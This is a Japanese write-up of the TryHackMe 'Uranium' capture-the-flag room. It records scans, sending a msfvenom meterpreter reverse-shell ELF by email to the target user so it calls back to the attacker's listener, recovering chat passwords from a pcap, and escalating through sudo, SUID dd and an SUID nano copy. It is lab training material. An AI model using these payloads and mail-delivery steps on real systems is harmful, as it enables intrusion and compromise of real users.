# Uranium CTF

https://tryhackme.com/room/uranium

## Enumeration

```shell
TARGET=10.146.129.243
sudo bash -c "echo $TARGET   uranium.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
25/tcp open  smtp    syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,25,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

SSH, SMTP, HTTP

```sh
root@ip-10-146-96-9:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.129.243
+ Target Hostname:    uranium.thm
+ Target Port:        80
+ Start Time:         2026-04-27 02:07:49 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x286f 0x5c0a451dc67dd 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ 1707 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2026-04-27 02:07:51 (GMT1) (2 seconds)
---------------------------------------------------------------------------
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.146.129.243/ ----
==> DIRECTORY: http://10.146.129.243/assets/                                                                            
==> DIRECTORY: http://10.146.129.243/images/                                                                            
+ http://10.146.129.243/index.html (CODE:200|SIZE:10351)                                                                
+ http://10.146.129.243/server-status (CODE:403|SIZE:279)
```

```sh
dirsearch -u http://$TARGET -e php,txt

[02:10:18] 200 -  476B  - /assets/
[02:10:18] 301 -  317B  - /assets  ->  http://10.146.129.243/assets/
[02:10:36] 301 -  317B  - /images  ->  http://10.146.129.243/images/
[02:10:36] 200 -  517B  - /images/
[02:10:40] 200 -    6KB - /LICENSE.txt
[02:10:55] 200 -  500B  - /README.txt
```

### サブドメイン

X を見ると、`uranium.thm` の表記があった。

サブドメインを探したが見つからなかった。

```sh
ffuf -u http://uranium.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.uranium.thm' -fs 10351
```

## X

Xのポスト。メールアドレスは、`hakanbey@uranium.thm` か？  
アプリケーションというのがバイナリファイルなのか何なのかは不明。

```
Everyone can send me application files (filename: "application") from my mail account. I open and review all applications one by one in the terminal.
```

バイナリを送って実行されるか試してみる。

ペイロードの作成

```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.128.106 LPORT=4444 -f elf > application
```

メール送信

```sh
swaks --to hakanbey@uranium.thm \      
      --from sender@example.com \
      --server uranium.thm \
      --body "please review an application" \
      --attach @application
```

リバースシェル取得成功

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.128.106; set LPORT 4444;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
LHOST => 192.168.128.106
LPORT => 4444
[*] Started reverse TCP handler on 192.168.128.106:4444 
[*] Sending stage (3090404 bytes) to 10.146.129.243
[*] Meterpreter session 1 opened (192.168.128.106:4444 -> 10.146.129.243:55096) at 2026-04-26 21:40:04 -0400

meterpreter > 
```

user1フラグ回収。

```sh
id
uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey)
pwd
/home/hakanbey
ls -al
total 100
drwxr-xr-x 7 hakanbey hakanbey  4096 May  4  2021 .
drwxr-xr-x 4 root     root      4096 Apr 23  2021 ..
lrwxrwxrwx 1 root     root         9 Apr 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 hakanbey hakanbey   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 hakanbey hakanbey  3771 Apr  4  2018 .bashrc
drwx------ 2 hakanbey hakanbey  4096 Apr  9  2021 .cache
drwxr-x--- 3 hakanbey hakanbey  4096 Apr 10  2021 .config
drwx------ 4 hakanbey hakanbey  4096 Apr 10  2021 .gnupg
drwxrwxr-x 3 hakanbey hakanbey  4096 Apr  9  2021 .local
-rw-r--r-- 1 hakanbey hakanbey   807 Apr  4  2018 .profile
-rw-rw-r-- 1 hakanbey hakanbey    66 Apr  9  2021 .selected_editor
-rw-r--r-- 1 hakanbey hakanbey     0 Apr  9  2021 .sudo_as_admin_successful
-rwxrwxr-x 1 hakanbey hakanbey 49376 Apr  9  2021 chat_with_kral4
drwxrwxr-x 2 hakanbey hakanbey  4096 Apr 27 01:40 mail_file
-rw-rw-r-- 1 hakanbey hakanbey    38 Apr 10  2021 user_1.txt
```

## 権限昇格１

Pythonベースのバイナリファイルを解析しようとしたが、単純な pyinstaller のバイナリではなく cython によるもので解析が困難。

```sh
$ file chat_with_kral4 
chat_with_kral4: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3cf57a90a14e7b2771cb14cd9b1837fe9fa7495b, for GNU/Linux 3.2.0, not stripped
```

1234ポートでリッスンしている。おそらくパスワード情報はリッスンしているサービス側で持っているため、バイナリを解析してもパスワードは出てこないのではないかと思われる。

```sh
ss -tlpn     
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128               127.0.0.1:1234             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         100                 0.0.0.0:25               0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*       
LISTEN   0         100                    [::]:25                  [::]:*       
nc localhost 1234
aaa
NOT AUTHORIZED
```

リッスン側のサービス

```sh
hakanbey@uranium:~$ cat /etc/systemd/system/chatbot.service
cat /etc/systemd/system/chatbot.service
[Unit]
Description=chatbot

[Service]
User=kral4
WorkingDirectory=/home/kral4
ExecStart=/home/kral4/chat_with_hakanbey
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

詰まった。今後のフローを予想すると、下記のようになると推測。

1. チャットアプリのパスワードを得る
2. チャットからhakanbeyユーザーのパスワードを得る
3. sudo で kral4 へ昇格する
4. kral4 で webフラグを回収（ddコマンドにSUIDが付いているのを発見済）
5. kral4 から root に昇格

チャットアプリのパスワードを得る方法の可能性

1. chat_with_kral4 バイナリを解析
2. OSINT
3. ログファイル等に出ている
4. kral4 に対してフィッシング（kral4にもメールがある）

```sh
hakanbey@uranium:~$ ls -al /var/mail
ls -al /var/mail
total 16
drwxrwsr-x  2 root     mail 4096 Apr 27 04:48 .
drwxr-xr-x 14 root     root 4096 Apr  9  2021 ..
-rw-------  1 hakanbey mail  938 Apr 27 04:48 hakanbey
-rw-------  1 kral4    mail 1097 Apr 24  2021 kral4
```

試しにパスワードを忘れた！というメールを hakanbey から kral4 に送ってみたら、

```sh
$ swaks --to kral4@uranium.thm \
      --from hakanbey@uranium.thm \
      --server uranium.thm \
      --body "I forgot a chat password\!"
```

/var/mail/hakanbey が 0バイトになった。どういうことか・・・？

```sh
hakanbey@uranium:~$ ls -al /var/mail
ls -al /var/mail
total 12
drwxrwsr-x  2 root     mail 4096 Apr 27 05:03 .
drwxr-xr-x 14 root     root 4096 Apr  9  2021 ..
-rw-------  1 hakanbey mail    0 Apr 27 05:04 hakanbey
-rw-------  1 kral4    mail 3059 Apr 27 05:01 kral4
```

送信前はこういう内容だった。Subjectにコマンドを入れてメール送信によりコマンド実行している？

```sh
hakanbey@uranium:~$ cat /var/mail/hakanbey
cat /var/mail/hakanbey
From hakanbey@uranium.thm  Mon Apr 27 02:22:01 2026
Return-Path: <hakanbey@uranium.thm>
X-Original-To: hakanbey
Delivered-To: hakanbey@uranium.thm
Received: by uranium (Postfix, from userid 1000)
        id 2B0AC401A2; Mon, 27 Apr 2026 02:22:01 +0000 (UTC)
From: root@uranium.thm (Cron Daemon)
To: hakanbey@uranium.thm
Subject: Cron <hakanbey@uranium> ripmime -i /var/mail/hakanbey -d /home/hakanbey/mail_file/ ; find /home/hakanbey/mail_file/ -name "application*" -type f -exec chmod +x {} \; -exec {} \; ; > /var/mail/hakanbey ; rm /home/hakanbey/mail_file/*
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/home/hakanbey>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=hakanbey>
Message-Id: <20260427022201.2B0AC401A2@uranium>
Date: Mon, 27 Apr 2026 02:22:01 +0000 (UTC)

rm: cannot remove '/home/hakanbey/mail_file/*': No such file or directory
```

下記のようにコマンド実行を試みたが、/tmp/hello は作られなかった。

```sh
$ swaks --to kral4@uranium.thm \
      --from sender@example.com \
      --server uranium.thm \
      --header "Subject: Cron <kral4@uranium> echo hello > /tmp/hello" \
      --body "please review an application"
```

X-Cron-Env を追加して実行したが変わらず。

```sh
$ swaks --to kral4@uranium.thm \
      --from sender@example.com \
      --server uranium.thm \
      --header "Subject: Cron <kral4@uranium> echo hello > /tmp/hello" \
      --header "X-Cron-Env: <SHELL=/bin/sh>" \
      --header "X-Cron-Env: <HOME=/home/kral4>" \
      --header "X-Cron-Env: <PATH=/usr/bin:/bin>" \
      --header "X-Cron-Env: <LOGNAME=kral4>" \
      --body "please review an application"
```

pcap ファイルを発見。

```sh
hakanbey@uranium:~$ find / -name '*hakanbey*' 2>/dev/null
find / -name '*hakanbey*' 2>/dev/null
/home/hakanbey
/var/log/hakanbey_network_log.pcap
/var/mail/hakanbey
```

Wireshark で TCP ストリームを表示。チャットアプリのパスワードが判明。

```sh
[REDACTED]
Hi Kral4

Hi bro

I forget my password, do you know my password ?

Yes, wait a sec I'll send you.

Oh , yes yes I remember. No need anymore. Ty..

Okay bro, take care !
```

チャットで会話を試していたら、パスワードを教えてくれた。

```sh
./chat_with_kral4
PASSWORD :[REDACTED]
kral4:hi hakanbey

->I forget my password, do you know my password ?
hakanbey:I forget my password, do you know my password ?
?

->password
hakanbey:password
?

->hello
hakanbey:hello
kral4:how are you?

->I forgot my password
hakanbey:I forgot my password
?

->what can you do?
hakanbey:what can you do?
?

->hello
hakanbey:hello
kral4:how are you?

->i'm fine
hakanbey:i'm fine
kral4:what now? did you forgot your password again

->yes
hakanbey:yes
kral4:okay your password is [REDACTED] don't lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated
```

kral4 として /bin/bash を実行できる。

```sh
hakanbey@uranium:~$ sudo -l
sudo -l
[sudo] password for hakanbey: 

Matching Defaults entries for hakanbey on uranium:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash
```

昇格成功。

```sh
hakanbey@uranium:~$ sudo -u kral4 /bin/bash
sudo -u kral4 /bin/bash
kral4@uranium:~$ 
```

ユーザー２フラグ回収。

```sh
kral4@uranium:/home/kral4$ ls -al
ls -al
total 140
drwxr-x--- 3 kral4 kral4   4096 May  4  2021 .
drwxr-xr-x 4 root  root    4096 Apr 23  2021 ..
lrwxrwxrwx 1 root  root       9 Apr 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kral4 kral4    220 Apr  9  2021 .bash_logout
-rw-r--r-- 1 kral4 kral4   3771 Apr  9  2021 .bashrc
-rw-r--r-- 1 kral4 kral4      5 Apr 27 05:51 .check
drwxrwxr-x 3 kral4 kral4   4096 Apr 10  2021 .local
-rw-r--r-- 1 kral4 kral4    807 Apr  9  2021 .profile
-rwxr-xr-x 1 kral4 kral4 109960 Apr  9  2021 chat_with_hakanbey
-rw-rw-r-- 1 kral4 kral4     38 Apr 10  2021 user_2.txt
```

## 権限昇格２

dd にSUIDが付いている。

```sh
kral4@uranium:/home/kral4$ ls -al /bin/dd
ls -al /bin/dd
-rwsr-x--- 1 web kral4 76000 Apr 23  2021 /bin/dd
```

Webフラグを回収。

```sh
kral4@uranium:/home/kral4$ dd if=/var/www/html/web_flag.txt
dd if=/var/www/html/web_flag.txt
thm{[REDACTED]}
0+1 records in
0+1 records out
38 bytes copied, 0.000698983 s, 54.4 kB/s
```

メールを見たら、rootからのメッセージで、homeフォルダのnanoファイルにSUIDを付けたとのこと。

```sh
kral4@uranium:/home/kral4$ cat /var/mail/kral4
cat /var/mail/kral4
From root@uranium.thm  Sat Apr 24 13:22:02 2021
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
        by uranium (Postfix) with ESMTP id C7533401C2
        for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
Message-ID: <841530.943147035-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-992935.514616878
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.
```

bash を nano として保存してみたが、SUIDが付く気配はない。

```sh
kral4@uranium:/home/kral4$ cp /bin/bash ./nano
```

index.html という点に注目して、/var/www/html/nano を作ってみたが同じ。

```sh
kral4@uranium:/home/kral4$ dd if=/bin/bash of=/var/www/html/nano
dd if=/bin/bash of=/var/www/html/nano
2174+1 records in
2174+1 records out
1113504 bytes (1.1 MB, 1.1 MiB) copied, 0.00511689 s, 218 MB/s
```

root にSUIDを付けるようメールを送ってみたが、反応なし。

```sh
$ swaks --to root@uranium.thm \
      --from kral4@uranium.thm \
      --server uranium.thm \
      --body "Please give SUID to the nano file in my folder."
```

htmlcheck.service サービスを発見。

```sh
kral4@uranium:/home/kral4$ cat /etc/systemd/system/htmlcheck.service
cat /etc/systemd/system/htmlcheck.service
[Unit]
Description=htmlcheck

[Service]
User=root
WorkingDirectory=/root/
ExecStart=/usr/bin/python3 /root/htmlcheck.py
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

index.html への攻撃を検知したら、/home/kral4/nano にSUIDを付けているのでは？

/var/www/html/index.html を書き換えると、なぜかVMごと落ちて ping も通らなくなる。

```sh
cp /bin/bash /home/kral4/nano

echo '<!DOCTYPE html><html><head><title>HACKED</title></head><body>HACKED</body></html>' > /home/kral4/index.html

dd if=/home/kral4/index.html of=/var/www/html/index.html

kral4@uranium:/home/kral4$ meterpreter > 
[*] 10.146.142.229 - Meterpreter session 1 closed.  Reason: Died
```

試行錯誤したところ、`cp /bin/bash /home/kral4/nano` を実行していなければVMが落ちなくなることが分かった。

bashではなく、nano をコピーしてみる。

```sh
kral4@uranium:/home/kral4$ cp /bin/nano ./
```

nano にSUIDが付いた！

```sh
kral4@uranium:/home/kral4$ ls -al
ls -al
total 388
drwxr-x--- 3 kral4 kral4   4096 Apr 27 10:10 .
drwxr-xr-x 4 root  root    4096 Apr 23  2021 ..
lrwxrwxrwx 1 root  root       9 Apr 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kral4 kral4    220 Apr  9  2021 .bash_logout
-rw-r--r-- 1 kral4 kral4   3771 Apr  9  2021 .bashrc
-rw-r--r-- 1 kral4 kral4      5 Apr 23  2021 .check
drwxrwxr-x 3 kral4 kral4   4096 Apr 10  2021 .local
-rw-r--r-- 1 kral4 kral4    807 Apr  9  2021 .profile
-rwxr-xr-x 1 kral4 kral4 109960 Apr  9  2021 chat_with_hakanbey
-rw-r--r-- 1 kral4 kral4     82 Apr 27 10:06 index.html
-rwsrwxrwx 1 root  root  245872 Apr 27 10:10 nano
-rw-rw-r-- 1 kral4 kral4     38 Apr 10  2021 user_2.txt
```

これで読めた。

```sh
kral4@uranium:/home/kral4$ ./nano -I /root/root.txt
```

## 振り返り

- 6時間近くかかったがノーヒントでクリア成功。
- Twitter(X) を必須の情報源にするのは本当にやめてほしいと思うが、メールとチャットのフィッシングシミュレーションは斬新で面白かった。
- VMごと落ちる設計だけはやめてほしい。試行錯誤で10回以上再起動を強いられた。
- なぜVMごと落ちたのか、サービスのPythonファイルを見てみた。 /bin/nano とのハッシュ比較をして、違っていたらシャットダウンしていた。
- ずっとリバースシェルで作業していたのだが、hakanbeyのパスワードを入手した時点でSSH接続可能だったので、SSH接続していれば wall のメッセージに気付けたのかもしれない。

```python
import hashlib
import os, os.path
import time

index_path = "/var/www/html/index.html"
nano_path = "/home/kral4/nano"

index_hash = hashlib.md5(open(index_path, 'rb').read()).hexdigest()
nano_hash = hashlib.md5(open("/bin/nano", 'rb').read()).hexdigest()


def check_integrity():
    while True:
        if hashlib.md5(open(index_path, 'rb').read()).hexdigest() != index_hash:
            if os.path.isfile(nano_path):
                if hashlib.md5(open(nano_path, 'rb').read()).hexdigest() != nano_hash:
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    time.sleep(5)
                    os.system('shutdown now')
                else:
                    time.sleep(5)
                    os.system("sendEmail -t kral4@uranium.thm -f root@uranium.thm -s 127.0.0.1 -u \"Hi Kral4\" -m $
                    time.sleep(10)
                    os.system("chown root:root /home/kral4/nano && chmod 4777 /home/kral4/nano")
                    break
            else:
                #no nano
                pass
        time.sleep(5)

check_integrity()
```

## Tags

#tags:フィッシング
